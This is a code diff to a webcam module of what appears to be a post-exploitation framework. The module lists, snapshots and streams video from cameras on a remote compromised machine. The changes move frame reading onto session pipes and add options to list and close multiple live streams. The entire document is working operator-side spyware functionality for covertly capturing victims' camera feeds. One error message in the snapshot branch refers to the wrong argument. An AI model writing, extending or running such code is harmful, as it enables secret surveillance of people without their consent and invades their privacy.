@@ -17,11 +17,9 @@ from badges.cmd import Command
 
 CAM_BASE = 5
 
-CAM_FRAME = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL)
-CAM_LIST = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 1)
-CAM_START = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 2)
-CAM_STOP = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 3)
+CAM_LIST = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL)
 
+CAM_PIPE = tlv_custom_pipe(PIPE_STATIC, CAM_BASE, PIPE_TYPE)
 CAM_ID = tlv_custom_type(TLV_TYPE_INT, CAM_BASE, API_TYPE)
 
 
@@ -60,6 +58,22 @@ class ExternalCommand(Command):
                     }
                 ),
                 (
+                    ('-L',),
+                    {
+                        'help': "List actively streaming devices.",
+                        'dest': 'streams',
+                        'action': 'store_true'
+                    }
+                ),
+                (
+                    ('-c', '--close'),
+                    {
+                        'help': "Close all streams for device.",
+                        'metavar': 'ID',
+                        'type': int
+                    }
+                ),
+                (
                     ('-o', '--output'),
                     {
                         'help': "Local file to save snapshot to.",
@@ -69,22 +83,19 @@ class ExternalCommand(Command):
             ]
         })
 
-        self.stop = False
+        self.running = {}
 
-    def read_thread(self, path: str):
+    def read_thread(self, path, device):
         while True:
-            if self.stop:
+            stream = self.running.get(device, None)
+
+            if not stream:
                 break
 
-            result = self.session.send_command(
-                tag=CAM_FRAME
+            frame = self.session.pipes.readall_pipe(
+                pipe_type=CAM_PIPE,
+                pipe_id=stream['ID']
             )
-
-            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-                self.print_error(f"Failed to read device!")
-                break
-
-            frame = result.get_raw(TLV_TYPE_BYTES)
 
             try:
                 with open(path, 'wb') as f:
@@ -94,46 +105,77 @@ class ExternalCommand(Command):
                 self.print_error(f"Failed to write image to {path}!")
 
     def run(self, args):
-        if args.stream is not None:
-            result = self.session.send_command(
-                tag=CAM_START,
-                args={
-                    CAM_ID: args.stream - 1,
-                }
-            )
+        if args.streams:
+            data = []
 
-            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
+            for device, stream in self.running.items():
+                data.append((device, stream['Stream'].path,
+                             stream['Stream'].image))
+
+            if not data:
+                self.print_warning('No active streams running.')
+                return
+
+            self.print_table('Active streams', ('ID', 'Path', 'Image'), *data)
+
+        elif args.close:
+            stream = self.running.get(args.close, None)
+
+            if not stream:
+                self.print_error(f"Device #{str(args.close)} not streaming!")
+                return
+
+            self.running.pop(args.close, None)
+
+            self.print_process(f"Suspending device #{str(args.close)}...")
+            stream['Thread'].join()
+
+            self.session.pipes.destroy_pipe(CAM_PIPE, stream['ID'])
+            self.session.loot.remove_loot(stream['Stream'].image)
+            self.session.loot.remove_loot(stream['Stream'].path)
+
+        elif args.stream:
+            stream = self.running.get(args.stream, None)
+
+            if stream:
+                self.print_warning(f"Device #{str(args.stream)} is already streaming.")
+
+                stream['Stream'].stream()
+                return
+
+            try:
+                pipe_id = self.session.pipes.create_pipe(
+                    pipe_type=CAM_PIPE,
+                    args={
+                        CAM_ID: args.stream - 1
+                    }
+                )
+
+            except RuntimeError:
                 self.print_error(f"Failed to open device #{str(args.stream)}!")
                 return
+
+            self.print_process(f"Streaming device #{str(args.stream)}...")
 
             file = self.session.loot.random_loot('png')
             path = self.session.loot.random_loot('html')
 
-            thread = threading.Thread(target=self.read_thread, args=(file,))
-            thread.setDaemon(True)
-            thread.start()
-
             client = StreamClient(path=path, image=file)
             client.create_video()
 
-            self.print_process(f"Streaming device #{str(args.stream)}...")
-            self.print_information("Press Ctrl-C to stop.")
+            thread = threading.Thread(target=self.read_thread, args=(file, args.stream))
+            thread.setDaemon(True)
 
-            try:
-                client.stream()
-                for _ in sys.stdin:
-                    pass
+            self.running.update({
+                args.stream: {
+                    'Stream': client,
+                    'ID': pipe_id,
+                    'Thread': thread
+                }
+            })
 
-            except KeyboardInterrupt:
-                self.print_process("Stopping...")
-                self.stop = True
-
-            thread.join()
-
-            self.session.send_command(tag=CAM_STOP)
-            self.session.loot.remove_loot(file)
-            self.session.loot.remove_loot(path)
-            self.stop = False
+            thread.start()
+            client.stream()
 
         elif args.list:
             result = self.session.send_command(
@@ -145,40 +187,36 @@ class ExternalCommand(Command):
 
             while device:
                 self.print_information(f"{str(id): <4}: {device}")
-                id -= 1
+                id += 1
 
                 device = result.get_string(TLV_TYPE_STRING)
 
-        elif args.snap is not None:
-            result = self.session.send_command(
-                tag=CAM_START,
-                args={
-                    CAM_ID: args.snap - 1,
-                }
-            )
+        elif args.snap:
+            try:
+                pipe_id = self.session.pipes.create_pipe(
+                    pipe_type=CAM_PIPE,
+                    args={
+                        CAM_ID: args.snap - 1
+                    }
+                )
 
-            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-                self.print_error(f"Failed to open device #{str(args.snap)}!")
+            except RuntimeError:
+                self.print_error(f"Failed to open device #{str(args.stream)}!")
                 return
 
-            result = self.session.send_command(
-                tag=CAM_FRAME
-            )
-
-            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-                self.print_error(f"Failed to read device #{str(args.snap)}!")
-                self.session.send_command(tag=CAM_STOP)
-                return
-
-            frame = result.get_raw(TLV_TYPE_BYTES)
             output = args.output or self.session.loot.random_loot('png')
 
             try:
                 with open(output, 'wb') as f:
-                    f.write(frame)
-                self.print_success(f"Saved image to {output}!")
+                    f.write(
+                        self.session.pipes.readall_pipe(
+                            pipe_type=CAM_PIPE,
+                            pipe_id=pipe_id
+                        )
+                    )
+                    self.print_success(f"Saved image to {output}!")
 
             except Exception:
                 self.print_error(f"Failed to write image to {output}!")
 
-            self.session.send_command(tag=CAM_STOP)
+            self.session.pipes.destroy_pipe(CAM_PIPE, pipe_id)
